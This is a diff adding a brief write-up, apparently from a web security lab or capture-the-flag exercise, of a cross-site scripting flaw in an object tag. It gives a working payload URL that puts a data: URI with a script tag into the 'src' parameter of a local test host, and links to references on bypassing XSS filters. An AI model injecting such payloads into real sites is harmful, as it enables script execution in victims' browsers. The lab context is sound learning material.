@@ -1,0 +1,10 @@
+we exploit here the html tag object.
+the data from this tag is set from an user provided value
+go to:
+http://192.168.56.101/?page=media&src=data:text/html,%3Cscript%3Ealert(%27hi%27);%3C/script%3E
+to see it
+
+Ressources:
+ - https://developer.mozilla.org/fr/docs/Web/HTTP/Basics_of_HTTP/Data_URIs
+ - https://blog.mozilla.org/security/2017/11/27/blocking-top-level-navigations-data-urls-firefox-59/
+ - https://www.paladion.net/blogs/bypass-xss-filters-using-data-uris
